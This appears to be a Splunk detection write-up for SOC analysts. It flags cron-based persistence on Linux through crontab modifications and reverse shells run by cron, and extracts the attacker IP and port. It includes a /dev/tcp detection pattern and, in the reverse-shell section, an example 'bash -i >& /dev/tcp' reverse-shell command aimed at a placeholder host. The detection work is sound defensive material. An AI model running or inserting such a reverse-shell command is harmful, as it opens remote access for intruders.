# Overview

This detection identifies suspicious cron job modifications and scheduled commands that may establish persistence on a Linux endpoint.

Attackers commonly abuse cron jobs to maintain access after compromising a system by creating scheduled tasks that execute malicious commands, reverse shells, or unauthorized scripts.

The detection focuses on:

- Cron table modifications
- Suspicious scheduled commands
- Network-based reverse shell patterns
- Command execution through cron

---

# Detection Objective

The objective of this detection is to identify:

- Unauthorized persistence mechanisms
- Malicious cron jobs
- Reverse shell execution
- Scheduled attacker activity

The detection provides visibility into:

- User creating or modifying cron entries
- Executed cron command
- Remote attacker IP
- Remote listener port
- Target Linux system

# SPL Detection

```spl
index=linux_logs (sourcetype=syslog OR _raw="*cron*")
| rex field=_raw "crontab\[\d+\]:\s+\((?<user>\S+)\)\s+(?<action>LIST|BEGIN|REPLACE|END)"
| rex field=_raw "CRON\[\d+\]:\s+\((?<user>\S+)\)\s+CMD\s+\((?<executed_payload>.*)\)"

| rex field=executed_payload "tcp/(?<attacker_ip>\d+\.\d+\.\d+\.\d+)/(?<attacker_port>\d+)"

| rename host as target_system

| eval activity_summary = case(
    match(executed_payload, "/dev/tcp"), "CRITICAL - Interactive Reverse Shell Fired",
    action="REPLACE", "High - Cron Table Modified (Job Created)",
    1=1, "Low - Standard Cron Activity"
)

| stats
    values(action) as crontab_actions,
    values(executed_payload) as active_payload_executed,
    values(attacker_ip) as target_c2_ip,
    values(attacker_port) as target_c2_port,
    min(_time) as first_seen,
    max(_time) as last_seen
    by user, target_system, activity_summary

| where activity_summary="CRITICAL - Interactive Reverse Shell Fired" OR activity_summary="High - Cron Table Modified (Job Created)"

| fieldformat first_seen = strftime(first_seen, "%Y-%m-%d %H:%M:%S")
| fieldformat last_seen = strftime(last_seen, "%Y-%m-%d %H:%M:%S")

| sort - last_seen

| table last_seen, target_system, user, activity_summary, crontab_actions, active_payload_executed, target_c2_ip, target_c2_port
```

# Detection Logic Explanation

## 1. Monitor Cron Activity

The detection searches Linux logs for:

```
cron
crontab
CMD execution
```

events.

These indicate scheduled task activity.

---

## 2. Detect Cron Modification

The detection identifies:

```
REPLACE
```

actions.

A REPLACE action indicates that a user modified an existing crontab or created a new scheduled job.

---

## 3. Identify Reverse Shell Behavior

The detection looks for:

```
/dev/tcp
```

patterns.

Example behavior:

```
bash -i >& /dev/tcp/attacker_ip/port
```

This commonly indicates a reverse shell attempting outbound communication.

# Lessons Learned

Cron jobs are a common Linux persistence mechanism because they execute automatically and often run without user interaction.

Monitoring cron modifications and suspicious scheduled commands provides SOC analysts with early visibility into attacker persistence attempts.
